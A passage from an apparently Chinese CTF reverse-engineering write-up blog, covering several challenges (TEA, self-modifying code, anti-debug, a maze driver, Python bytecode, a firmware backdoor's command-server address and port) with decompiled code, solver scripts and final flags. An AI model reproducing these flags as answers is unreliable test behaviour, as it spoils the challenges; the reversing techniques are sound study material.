刚开始还犯了错误，逐字节解密得到错误flag：l3ts_m4k3^4^DDSOUR_t0d4y 因为题目是将每8字节打包进行加法，其中有进位，而逐字节加法不会产生进位，所以出了问题 第八周 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:3:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 大佬喝茶~ 偷懒没有管花指令 ida载入，进main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { int j; // [rsp+14h] [rbp-7Ch] int i; // [rsp+18h] [rbp-78h] char input[48]; // [rsp+20h] [rbp-70h] BYREF char v7[32]; // [rsp+50h] [rbp-40h] BYREF __int64 v8[4]; // [rsp+70h] [rbp-20h] BYREF v8[3] = __readfsqword(0x28u); v8[0] = 0x4837F6D54BAA4D13LL; v8[1] = 0x203F4E88752F3489LL; printf(\"Hello there. Plz Input your flag: \"); __isoc99_scanf(\"%40s\", input); if ( strlen(input) != 32 ) { printf(\"nope\\n\"); exit(0); } for ( i = 0; i \u003c 32; ++i ) v7[i] = input[i]; ((void (__fastcall *)(__int64 *, char *, __int64))sub_1180)(v8, v7, 4LL); for ( j = 0; j \u003c 32; ++j ) { if ( (unsigned __int8)v7[j] != en_flag[j] ) { printf(\"nope\\n\"); exit(0); } } printf(\"you are right!\\n\"); return 0LL; } 可以看出就是把input复制给v7然后经sub_1180函数加密然后和en_flag比较 跟进sub_1180 __int64 __fastcall sub_1180(unsigned int *a1, __int64 a2, unsigned int a3) { unsigned int v4; // [rsp+0h] [rbp-4Ch] unsigned int v5; // [rsp+4h] [rbp-48h] unsigned int v6; // [rsp+8h] [rbp-44h] unsigned int v7; // [rsp+Ch] [rbp-40h] unsigned int j; // [rsp+14h] [rbp-38h] unsigned int i; // [rsp+18h] [rbp-34h] int v10; // [rsp+1Ch] [rbp-30h] unsigned int v11; // [rsp+20h] [rbp-2Ch] unsigned int v12; // [rsp+24h] [rbp-28h] v7 = _byteswap_ulong(*a1); v6 = _byteswap_ulong(a1[1]); v5 = _byteswap_ulong(a1[2]); v4 = _byteswap_ulong(a1[3]); for ( i = 0; i \u003c a3; ++i ) { v10 = 0; v12 = *(unsigned __int8 *)(a2 + 8 * i + 3) | (*(unsigned __int8 *)(a2 + 8 * i + 2) \u003c\u003c 8) | (*(unsigned __int8 *)(a2 + 8 * i + 1) \u003c\u003c 16) | (*(unsigned __int8 *)(a2 + 8 * i) \u003c\u003c 24); v11 = *(unsigned __int8 *)(a2 + 8 * i + 7) | (*(unsigned __int8 *)(a2 + 8 * i + 6) \u003c\u003c 8) | (*(unsigned __int8 *)(a2 + 8 * i + 5) \u003c\u003c 16) | (*(unsigned __int8 *)(a2 + 8 * i + 4) \u003c\u003c 24); for ( j = 0; j \u003c 0x20; ++j ) { v10 -= 1640531527; v12 += (v6 + (v11 \u003e\u003e 5)) ^ (v10 + v11) ^ (v7 + 16 * v11); v11 += (v4 + (v12 \u003e\u003e 5)) ^ (v10 + v12) ^ (v5 + 16 * v12); } *(_BYTE *)(a2 + 8 * i) = HIBYTE(v12); *(_BYTE *)(a2 + 8 * i + 1) = BYTE2(v12); *(_BYTE *)(a2 + 8 * i + 2) = BYTE1(v12); *(_BYTE *)(a2 + 8 * i + 3) = v12; *(_BYTE *)(a2 + 8 * i + 4) = HIBYTE(v11); *(_BYTE *)(a2 + 8 * i + 5) = BYTE2(v11); *(_BYTE *)(a2 + 8 * i + 6) = BYTE1(v11); *(_BYTE *)(a2 + 8 * i + 7) = v11; } return 0LL; } 能看出来就是tea加密 _byteswap_ulong这个细节需要注意，用处是把参数值以字节为单位颠倒前后顺序，也可以直接动调得到，即为key密钥 写脚本拿flag #include\u003cstdio.h\u003e unsigned char en_flag[32] ={104,16,10,183,126,253,224,41,184,177,19,193,252,91,54,195,103,70,92,25,222,185,88,154,107,135,19,206,70,106,56,107}; // int key[]={0x4BAA4D13,0x4837F6D5,0x752F3489,0x203F4E88}; unsigned int key[]={0x134daa4b,0xd5f63748,0x89342f75,0x884e3f20}; int delta =0x61C88647,v9; unsigned char flag[100]; unsigned int v10,v11; int main(){ for(int i=0;i\u003c4;i++){ *((char *)\u0026v11+3)=*(en_flag + 8 * i); *((char *)\u0026v11+2)=*(en_flag + 8 * i+1); *((char *)\u0026v11+1)=*(en_flag + 8 * i+2); *((char *)\u0026v11)=*(en_flag + 8 * i+3); *((char *)\u0026v10+3)=*(en_flag + 8 * i+4); *((char *)\u0026v10+2)=*(en_flag + 8 * i+5); *((char *)\u0026v10+1)=*(en_flag + 8 * i+6); *((char *)\u0026v10)=*(en_flag + 8 * i+7); for(int j=0x20-1;j\u003e=0;j--){ v9=(j+1)*delta*(-1); v10 -= (key[3] + (v11 \u003e\u003e 5)) ^ (v9 + v11) ^ (key[2] + 16 * v11); v11 -= (key[1] + (v10 \u003e\u003e 5)) ^ (v9 + v10) ^ (key[0] + 16 * v10); } *(flag + 8 * i) = *((char *)\u0026v11+3); *(flag + 8 * i + 1) = *((char *)\u0026v11+2); *(flag + 8 * i + 2) = *((char *)\u0026v11+1); *(flag + 8 * i + 3) = *((char *)\u0026v11); *(flag + 8 * i + 4) = *((char *)\u0026v10+3); *(flag + 8 * i + 5) = *((char *)\u0026v10+2); *(flag + 8 * i + 6) = *((char *)\u0026v10+1); *(flag + 8 * i + 7) = *((char *)\u0026v10); } puts(flag); } //19d9346d-410a-441f-b14e-9a60bb05 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:4:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 N1CTF oflo 太难啦~ 根据RX的wp复现还遇到了好多问题（（ ida打开只能看到start函数，点开offset main看到main函数全是红的，分析错误 400BB1 jmp那一行明显有花指令，loc_400BB1自己跳到自己，先按u取消定义，BB2那一行按c转换为code，BB1patch成nop BB7跳转到loc_400BBF，然后胡乱操作一通就retn了 因为return以后要执行BBC这一行，所以BBC这一行应该也是花指令 按u取消定义，把BBC patch掉，剩下两行转换成code，400CBA那一行同理 400D04和上面BB1同理，一样搞掉 D14下面这几行一堆乱数据，不知道有没有用，先不管 回到main函数开头按p创建函数，成功，F5却出现报错 是sp指针出了问题，可以通过Options-\u003eGeneral-\u003eDisassembly右边勾上stack pointer 可以明显看到loc_400BBF函数中的sp指针值出了问题 这样看来，这个函数就是为了扰乱sp存在的，直接从BB7到BD0全patch掉 同理CB5到CCE也全patch掉 但这时ida把main函数断在了CB9这一行 可以回到main函数开始按u取消定义，然后按c重新转换为code 然后终于可以快乐地F5了,main函数真容： void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 512uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026 0xFFFFC000, 0x10uLL, 7uLL); for ( i = 0; i \u003c= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((int)v5, (__int64)input + 5, (unsigned __int16)v5) ) write(1LL, \"Cong!\\n\", 6LL); exit(0LL); } 17行创建了一个sub_400A69函数段的指针 18行mprotect函数将sub_400A69段代码的权限改为7（即rwx） 然后20行修改了sub_400A69的代码，与input前5位（n1ctf）异或，即SMC，先写个脚本还原一下正确的代码 from ida_bytes import * key = \"n1ctf\" for i in range(10): patch_byte(0x400A69+i,get_byte(0x400A69+i)^ord(key[i%5])) 还原之后F5还是失败，原因是有和main函数一样的花指令和扰乱sp的代码，一样处理后得到函数 __int64 __fastcall sub_400A69(__int64 a1, __int64 a2) { __int64 v2; // rbp int i; // [rsp+14h] [rbp-2Ch] char v5[14]; // [rsp+18h] [rbp-28h] BYREF unsigned __int64 v6; // [rsp+30h] [rbp-10h] __int64 v7; // [rsp+38h] [rbp-8h] v7 = v2; v6 = __readfsqword(0x28u); v5[0] = 53; v5[1] = 45; v5[2] = 17; v5[3] = 26; v5[4] = 73; v5[5] = 125; v5[6] = 17; v5[7] = 20; qmemcpy(\u0026v5[8], \"+;\u003e=\u003c_\", 6); for ( i = 0; i \u003c= 13; ++i ) { if ( v5[i] != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) ) return 0LL; } return 1LL; } 重新进main函数看一下传进来的参数，这里需要再按一下F5，让ida根据修复后的代码重新分析一下 void __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 0x200uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026 0xFFFFC000, 16LL, 7LL); for ( i = 0; i \u003c= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((__int64)v5, (__int64)input + 5) ) write(1LL, \"Cong!\\n\", 6LL); exit(0LL); } 现在只需求出main函数里的v5即sub_400A69里的a1，即可解出flag sub_4008B9里面实现太复杂了，想法是动调得到v5，但这里面有ptrace反调试 又因为反调试在输入之前，所以可以先运行到输出，然后再attach上去 这里我做的时候只有root用户运行可以，普通用户会报错权限不足什么的，具体原因不清楚 attach上之后main函数点进去v5，可以看到需要的前14位就是Linux Version 最后写脚本解flag #include\u003cstdio.h\u003e char en_flag[]={53,45,17,26,73,125,17,20,'+',';','\u003e','=','\u003c','_'}; char v5[]=\"Linux Version \"; char flag[100]; int main(){ for(int i=0;i\u003c=13;i++){ flag[i]=(v5[i]+2)^en_flag[i]; } puts(flag); } // {Fam3_Is_NULL} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:5:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 XNUCA 2020 Unravel MFC 没有最难，只有更难，这周已经做得心态爆炸了（（ 开始连有用的函数都找不到，官方wp写得也有亿点简略，搞了几个小时也进展不大 先放放吧，后面再填坑 第七周 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:6:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×00 GUETCTF 2019 number game 拒 绝 暴 力 die查，Elf64，进ida main函数东西有点多，一个一个看 unsigned __int64 __fastcall main(int a1, char **a2, char **a3) { _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] __int64 v7; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); v5 = 0LL; v6 = 0; v7 = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\"%s\", \u0026v5); if ( (unsigned int)sub_4006D6((const char *)\u0026v5) ) { v4 = sub_400758((__int64)\u0026v5, 0, 10u); sub_400807((__int64)v4, (__int64)\u0026v7); v9 = 0; sub_400881(\u0026v7); if ( (unsigned int)sub_400917() ) { puts(\"TQL!\"); printf(\"flag{\"); printf(\"%s\", (const char *)\u0026v5); puts(\"}\"); } else { puts(\"your are cxk!!\"); //cai xu kun??? } } return __readfsqword(0x28u) ^ v10; } sub_4006D6（）判断输入是否为数字0-4，且共10位 剩下几个函数可以倒着看 第二个if里面sub_4006D6（）的判断是一个5*5的数独逻辑 1 4 # 2 3 3 0 # 1 # 0 # 2 3 # # 3 # # 0 4 2 # # 1 手动填一下是0421421430 sub_400881(\u0026v7)就是用上面的值填数独待检验 sub_400807（）应该只是复制了一下，v4-\u003ev7，动调验证确实啥也没干 主要加密函数是sub_400758（） _QWORD *__fastcall sub_400758(__int64 a1, int a2, unsigned int a3) { char v5; // [rsp+1Fh] [rbp-11h] _QWORD *v6; // [rsp+28h] [rbp-8h] v5 = *(_BYTE *)(a2 + a1); if ( v5 == ' ' || v5 == '\\n' || a2 \u003e= (int)a3 ) return 0LL; v6 = malloc(24uLL); *(_BYTE *)v6 = v5; v6[1] = sub_400758(a1, 2 * a2 + 1, a3); v6[2] = sub_400758(a1, 2 * (a2 + 1), a3); return v6; } 递归，2 * a2 + 1，2 * (a2 + 1)，第一感觉是二叉树访问左右子树，没点OI基础都做不了逆向（（ 动调验证一下，实际是通过对input按数组下标建立二叉树，然后输出中序遍历 于是可以根据0421421430手动建树，这里因为默认二叉树从左到右生长，所以保证了答案的唯一性 1 1 3 4 2 4 0 0 2 4 //flag：1134240024 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:6:1","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 HITCTF 2020 Node 没想法，没思路，verify函数上千行代码劝退（（ 只能拜读RX的wp 原来只要找到345行一逆就行while ( (char)(*((_BYTE *)v124 + v37) ^ 'r') + 'h' == key[v37] ) #include\u003cstdio.h\u003e unsigned char key[] = { 0x93, 0x85, 0x69, 0x82, 0x83, 0x84, 0x85, 0xC7, 0x69, 0xBA, 0x6D, 0x7B, 0x84, 0x6E, 0xBA, 0x7B, 0xBA, 0x7D, 0x83, 0x68, 0x86, 0x7C, 0x68, 0x83, 0x7F, 0x84, 0x7E, 0xC6, 0x6D, 0x6F, 0x6D, 0x6F }; char flag[100]; int main(){ for(int i=0;i\u003c32;i++){ flag[i]=(key[i]-'h')^'r'; } puts(flag); } //Yoshino-s want a girlfriend,wuwu 难点在于根本找不到 根据bb的wp获得思路，既然逆出来的东西要用来做web，那么一定在export窗口能找到 打开export窗口很显眼地就能看到key 查交叉引用就能找到verify函数，就能定位345行，问题解决，又长见识了 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×02 GKCTF 2020 BabyDriver die查，PE64，进ida 翻string窗口看到了 .data:0000000140003000 000000E1 C ****************o.*..*......*..**.**...**.*.*.***.****.**.*.*.***.......*.*.*****..***..*..**..***....**....**....***..**.***.***....**...***.**********..***......#****.***************************** 打开果然是个地图，共225byte 刚开始还以为是15*5，后面看代码觉得不对，最后确定是14*16 **************** o.*..*......*..* *.**...**.*.*.** *.****.**.*.*.** *...**....*.*.** ***..***.**.*..* *.**.***.**.**.* *.**.******.**.* *.**....***.**.* *.*****.***....* *...***.******** **..***......#** **.************* **************** 根据地图查交叉引用定位走地图逻辑函数 __int64 __fastcall sub_140001380(__int64 a1, __int64 a2) { __int64 v3; // rdi __int64 v4; // rax int v5; // ecx __int16 *v6; // rsi __int64 v7; // rbp __int16 v8; // dx char v9; // dl const CHAR *v10; // rcx if ( *(int *)(a2 + 48) \u003e= 0 ) { v3 = *(_QWORD *)(a2 + 24); v4 = *(_QWORD *)(a2 + 56) \u003e\u003e 3; if ( (_DWORD)v4 ) { v5 = dword_1400030E4; v6 = (__int16 *)(v3 + 2); v7 = (unsigned int)v4; while ( *(_WORD *)(v3 + 4) ) { LABEL_28: v6 += 6; if ( !--v7 ) goto LABEL_29; } byte_140003000[v5] = 46; v8 = *v6; if ( *v6 == 0x17 ) { if ( (v5 \u0026 0xFFFFFFF0) != 0 ) { v5 -= 16; goto LABEL_21; } v5 += 208; dword_1400030E4 = v5; } if ( v8 == 0x25 ) { if ( (v5 \u0026 0xFFFFFFF0) != 208 ) { v5 += 16; goto LABEL_21; } v5 -= 208; dword_1400030E4 = v5; } if ( v8 == 0x24 ) { if ( (v5 \u0026 0xF) != 0 ) { --v5; goto LABEL_21; } v5 += 15; dword_1400030E4 = v5; } if ( v8 != 0x26 ) goto LABEL_22; if ( (v5 \u0026 0xF) == 15 ) v5 -= 15; else ++v5; LABEL_21: dword_1400030E4 = v5; LABEL_22: v9 = byte_140003000[v5]; if ( v9 == 42 ) { v10 = \"failed!\\n\"; } else { if ( v9 != 35 ) { LABEL_27: byte_140003000[v5] = 111; goto LABEL_28; } v10 = \"success! flag is flag{md5(input)}\\n\"; } dword_1400030E4 = 16; DbgPrint(v10); v5 = dword_1400030E4; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(a2 + 65) ) *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3i64) |= 1u; return *(unsigned int *)(a2 + 48); } 上下左右逻辑容易看出来，但值0x17,0x25什么的太奇怪了 偷看师傅们的wp知道了原来是键盘扫描码，粘个链接 0x17-i-up 0x24-j-left 0x25-k-down 0x26-l-right 手动走一下：lkkkllklkkklllkkklllll 结果不对？？好吧得全大写再求md5 最终flag：flag{403950a6f64f7fc4b655dea696997851} 第六周 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:1","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×00 PyDis 附件是pyc，先想到uncompyle6 C:\\Users\\DX3906\\Desktop\\t1\u003euncompyle6 pyre.cpython-39.pyc\u003e2.py # Unsupported bytecode in file pyre.cpython-39.pyc # Unsupported Python version, 3.9.0, for decompilation 3.9不支持，痛苦开始 import dis,marshal f=open(\"pyre.cpython-39.pyc\",\"rb\").read() code = marshal.loads(f[16:]) dis.dis(code) 先抄含树师傅的代码得字节码 1 0 BUILD_LIST 0 2 LOAD_CONST 0 ((178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163)) 4 LIST_EXTEND 1 6 STORE_NAME 0 (magic) 2 8 LOAD_NAME 1 (input) 10 LOAD_CONST 1 ('flag \u003e\u003e\u003e ') 12 CALL_FUNCTION 1 14 STORE_NAME 2 (inp) 4 16 LOAD_NAME 3 (list) 18 LOAD_NAME 2 (inp) 20 CALL_FUNCTION 1 22 STORE_NAME 4 (flag) 5 24 LOAD_NAME 5 (len) 26 LOAD_NAME 4 (flag) 28 CALL_FUNCTION 1 30 LOAD_NAME 5 (len) 32 LOAD_NAME 0 (magic) 34 CALL_FUNCTION 1 36 COMPARE_OP 3 (!=) 38 POP_JUMP_IF_FALSE 54 6 40 LOAD_NAME 6 (print) 42 LOAD_CONST 2 ('qwq') 44 CALL_FUNCTION 1 46 POP_TOP 7 48 LOAD_NAME 7 (exit) 50 CALL_FUNCTION 0 52 POP_TOP 9 \u003e\u003e 54 LOAD_NAME 8 (range) 56 LOAD_NAME 5 (len) 58 LOAD_NAME 4 (flag) 60 CALL_FUNCTION 1 62 LOAD_CONST 3 (2) 64 BINARY_FLOOR_DIVIDE 66 CALL_FUNCTION 1 68 GET_ITER \u003e\u003e 70 FOR_ITER 54 (to 126) 72 STORE_NAME 9 (i) 10 74 LOAD_NAME 4 (flag) 76 LOAD_CONST 3 (2) 78 LOAD_NAME 9 (i) 80 BINARY_MULTIPLY 82 LOAD_CONST 4 (1) 84 BINARY_ADD 86 BINARY_SUBSCR 88 LOAD_NAME 4 (flag) 90 LOAD_CONST 3 (2) 92 LOAD_NAME 9 (i) 94 BINARY_MULTIPLY 96 BINARY_SUBSCR 98 ROT_TWO 100 LOAD_NAME 4 (flag) 102 LOAD_CONST 3 (2) 104 LOAD_NAME 9 (i) 106 BINARY_MULTIPLY 108 STORE_SUBSCR 110 LOAD_NAME 4 (flag) 112 LOAD_CONST 3 (2) 114 LOAD_NAME 9 (i) 116 BINARY_MULTIPLY 118 LOAD_CONST 4 (1) 120 BINARY_ADD 122 STORE_SUBSCR 124 JUMP_ABSOLUTE 70 12 \u003e\u003e 126 BUILD_LIST 0 128 STORE_NAME 10 (check) 14 130 LOAD_NAME 8 (range) 132 LOAD_NAME 5 (len) 134 LOAD_NAME 4 (flag) 136 CALL_FUNCTION 1 138 CALL_FUNCTION 1 140 GET_ITER \u003e\u003e 142 FOR_ITER 26 (to 170) 144 STORE_NAME 9 (i) 15 146 LOAD_NAME 10 (check) 148 LOAD_METHOD 11 (append) 150 LOAD_NAME 12 (ord) 152 LOAD_NAME 4 (flag) 154 LOAD_NAME 9 (i) 156 BINARY_SUBSCR 158 CALL_FUNCTION 1 160 LOAD_CONST 5 (222) 162 BINARY_XOR 164 CALL_METHOD 1 166 POP_TOP 168 JUMP_ABSOLUTE 142 17 \u003e\u003e 170 LOAD_NAME 8 (range) 172 LOAD_NAME 5 (len) 174 LOAD_NAME 0 (magic) 176 CALL_FUNCTION 1 178 CALL_FUNCTION 1 180 GET_ITER \u003e\u003e 182 FOR_ITER 34 (to 218) 184 STORE_NAME 9 (i) 18 186 LOAD_NAME 10 (check) 188 LOAD_NAME 9 (i) 190 BINARY_SUBSCR 192 LOAD_NAME 0 (magic) 194 LOAD_NAME 9 (i) 196 BINARY_SUBSCR 198 COMPARE_OP 3 (!=) 200 POP_JUMP_IF_FALSE 182 19 202 LOAD_NAME 6 (print) 204 LOAD_CONST 2 ('qwq') 206 CALL_FUNCTION 1 208 POP_TOP 20 210 LOAD_NAME 7 (exit) 212 CALL_FUNCTION 0 214 POP_TOP 216 JUMP_ABSOLUTE 182 22 \u003e\u003e 218 LOAD_NAME 6 (print) 220 LOAD_CONST 6 ('happy new year!') 222 CALL_FUNCTION 1 224 POP_TOP 226 LOAD_CONST 7 (None) 228 RETURN_VALUE 参考：死磕字节码 python官方文档 分析逻辑 大概是这个意思（还是习惯写c #include\u003cstdio.h\u003e char magic[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; char flag[100]; int main(){ scanf(\"%s\",flag); for(int i=0;i\u003c8;i++){ char x=flag[2*i]; flag[2*i]=flag[2*i+1]; flag[2*i+1]=x; } for(int i=0;i\u003c17;i++){ flag[i]^=222; if(flag[i]!=magic[i]){ puts(\"wrong\"); return 0; } } puts(\"write\"); } 写脚本解密 #include\u003cstdio.h\u003e char en_flag[]={178, 184, 185, 191, 182, 165, 174, 191, 129, 183, 187, 176, 129, 169, 191, 167, 163}; int main(){ for(int i=0;i\u003c17;i++){ en_flag[i]^=222; } for(int i=0;i\u003c8;i++){ char x=en_flag[2*i]; en_flag[2*i]=en_flag[2*i+1]; en_flag[2*i+1]=x; } puts(en_flag); } //flag{hapi_new_ya} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:7:2","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×01 FlareOn4 IgniteMe die查，无壳，PE32，进ida 主函数长这样 void __noreturn start() { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026NumberOfBytesWritten, 0); sub_4010F0(NumberOfBytesWritten); if ( sub_401050() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026NumberOfBytesWritten, 0); ExitProcess(0); } sub_4010F0()这个函数好像什么也没干 主要加密在sub_401050() int sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = sub_401020(byte_403078); v4 = sub_401000(); for ( i = v1 - 1; i \u003e= 0; --i ) { byte_403180[i] = v4 ^ byte_403078[i]; v4 = byte_403078[i]; } for ( j = 0; j \u003c 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)byte_403000[j] ) return 0; } return 1; } 看一下里面代码能猜出来sub_401020()就是strlen() v4直接动调就是0x4 写脚本解密 #include\u003cstdio.h\u003e char en_flag[]={13, 38,73, 69, 42, 23, 120, 68, 43, 108,93, 94, 69, 18, 47, 23, 43, 68, 111, 110,86, 9, 95, 69, 71, 115, 38, 10, 13, 19,23, 72, 66, 1, 64, 77, 12, 2, 105,0}; char flag[1000]; int main(){ char V4=4; for(int i=39;i\u003e=0;i--){ flag[i]=en_flag[i]^V4; V4=flag[i]; } puts(flag); } //flag;{R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:8:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 BUUCTF Firmware 这题难点在于工具的安装（（ 跟着含树师傅的wp走 windows比较麻烦，直接开虚拟机先装binwalk,觉得慢可以换个源 git clone https://github.com/devttys0/binwalk cd binwalk python setup.py install 先binwalk -e 拆包，四个文件，挨个file命令查看 有用的就是120200.squashfs，这里要用 firmware-mod-kit 的 unsquashfs_all.sh工具 然后就遇到了和bb师傅一样的问题，持续痛苦面具 幸好RX神是万能的 发现问题是github仓库的源代码有问题 换一个仓库一切正常了 git clone https://github.com/rampageX/firmware-mod-kit.git cd firmware-mod-kit/src ./configure make 利用uncramfs_all.sh拆120200.squashfs 发现/tmp里有个backdoor文件，这也太明显了，不过要是藏起来可能还真找不着 拖ida分析 先看string窗口直接就看到了 echo.byethost51.com 盲猜就是题目要的服务器地址，点进去看到变量名commServer，确信 查交叉引用找到了ininConnextion()函数 bool initConnection() { char *v0; // r0 char s[512]; // [sp+4h] [bp-208h] BYREF int v3; // [sp+204h] [bp-8h] memset(s, 0, sizeof(s)); if ( mainCommSock ) { close(mainCommSock); mainCommSock = 0; } if ( currentServer ) ++currentServer; else currentServer = 0; strcpy(s, (\u0026commServer)[currentServer]); v3 = 36667; if ( strchr(s, 58) ) { v0 = strchr(s, 58); v3 = atoi(v0 + 1); *strchr(s, 58) = 0; } mainCommSock = socket(2, 1, 0); return connectTimeout(mainCommSock, s, v3, 30) == 0; } 盲猜端口号就是v3=36667，实在太像了 于是flag{MD5(echo.byethost51.com:36667)}=flag{33a422c45d551ac6e4756f59812a954b} correct！ 第五周 2021-11-29 补上周，虽迟但到 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:9:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DDCTF Android Easy 下载附件是个zip 后缀改为apk用jeb打开 打开FlagActivity文件看java 甚至都不用算(( flag{DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:10:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 WELCOME TO JNI 【维基百科】 JNI （Java Native Interface，Java本地接口）是一种编程框架，使得Java虚拟机中的Java程序可以调用本地应用/或库，也可以被其他程序调用。 本地程序一般是用其它语言（C、C++或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序。 下载附件是apk，直接进jeb，打开MainActivity public class MainActivity extends AppCompatActivity { static { System.loadLibrary(\"native-lib\"); } public native boolean loginUtils(String arg1) { } @Override // androidx.appcompat.app.AppCompatActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main this.findViewById(0x7F080057).setOnClickListener(new View.OnClickListener() { // id:button @Override // android.view.View$OnClickListener public void onClick(View v) { boolean ok = MainActivity.this.loginUtils(((EditText)MainActivity.this.findViewById(0x7F0800B5)).getText().toString()); // id:inputBox 